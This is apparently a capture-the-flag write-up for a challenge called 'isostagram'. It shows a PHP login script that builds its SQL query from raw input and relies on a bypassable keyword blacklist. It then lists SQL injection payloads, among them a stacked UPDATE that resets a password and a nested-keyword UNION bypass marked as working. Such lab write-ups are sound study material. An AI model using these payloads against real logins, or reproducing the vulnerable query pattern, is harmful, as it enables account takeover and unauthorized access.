# isostagram
`kita0421`

- php src
```php

$host = 'isostagram_db';
$dbuser = 'MYSQL_USER';
$dbpassword = 'MYSQL_PASSWORD';
$dbname = 'ctf_users';
$link = mysqli_connect($host, $dbuser, $dbpassword, $dbname);

$loginStatus = NULL;
$username = $_POST['username'];
$password = $_POST['password'];

if (isset($username) && isset($password)) {
    error_log('POST: [' . $username . '] [' . $password . ']');
    if ($link) {
        $blacklist = array("union", "select", "where", "and", "or");
        $replace = array("", "", "", "", "");
        $username = str_ireplace($blacklist, $replace, $username);
        $password = str_ireplace($blacklist, $replace, $password);
        $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
        $query = mysqli_query($link, $sql);
        @$fetchs = mysqli_fetch_all($query, MYSQLI_ASSOC);
        if (@count($fetchs) > 0) {
            foreach ($fetchs as $fetch) {
                if ($fetch["username"] === 'kita0421' && $fetch["password"] === $password) {
                    $loginStatus = True;
                    break;
                }
                $loginStatus = False;
            }
        } else {
            $loginStatus = False;
        }
    } else {
        $loginStatus = NULL;
    }
} else {
    $loginStatus = NULL;
}
```

# ref 
[link](https://blog.csdn.net/qq_23667585/article/details/127213099?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-3-127213099-blog-88721329.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-3-127213099-blog-88721329.pc_relevant_recovery_v2&utm_relevant_index=4)
# payload
1. didn't work
```SQL
' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--

```
2. didn't work
```SQL
1' OORR '1' = '1' limit 1; --
```
3. didn't work
```SQL
' UORNION select '0','kita0421','1';--
' UORNION select 'kita0421','1','0';--
' UORNION select 'kita0421','1';--
```
4. worked!!!!!!
```sql
--                     id account   pw
-1' UORNION SORELECT 0,'kita0421','pass';#
```